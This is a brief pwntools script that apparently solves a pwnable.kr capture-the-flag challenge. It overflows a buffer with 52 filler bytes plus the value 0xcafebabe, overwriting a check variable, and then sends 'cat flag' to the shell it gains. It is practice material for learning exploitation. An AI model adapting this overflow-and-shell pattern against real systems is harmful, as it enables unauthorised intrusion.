from pwn import *

context(arch='amd64', os='linux', log_level='error')

p = remote('pwnable.kr', 9000)

payload = b'A' * 52
payload += b'\xbe\xba\xfe\xca'

p.sendline(payload)
# Read flag file
p.sendline(b'cat flag')
flag = p.recv()
print(flag)

